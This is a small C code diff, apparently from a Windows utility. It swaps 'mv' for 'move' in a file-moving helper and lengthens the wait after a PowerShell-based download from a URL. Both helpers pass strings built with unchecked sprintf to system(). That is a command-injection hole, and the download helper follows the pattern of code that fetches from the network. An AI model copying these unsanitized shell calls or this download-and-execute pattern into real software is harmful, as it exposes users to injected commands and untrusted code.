@@ -56,7 +56,7 @@ int unzip(char target[],char destination[]){
 int move_file(char target[],char destination[]){
     printf("[+] Moving file %s to %s\n",target,destination);
     char cmd_buf[MAX_PATH];
-    sprintf(cmd_buf,"mv %s %s",target,destination);
+    sprintf(cmd_buf,"move %s %s",target,destination);
     system(cmd_buf);
     Sleep(2000);
     return 1;
@@ -66,7 +66,7 @@ int download_pwsh(char *buffer,char *url){
     sprintf(buffer,PS1_COMMAND,url);
     system(buffer);
     clear_buffer(buffer);
-    Sleep(13000); //waiting for downloaded file.
+    Sleep(25000); //waiting for downloaded file.
     return 1;
 }
 int create_folder(char *buffer){
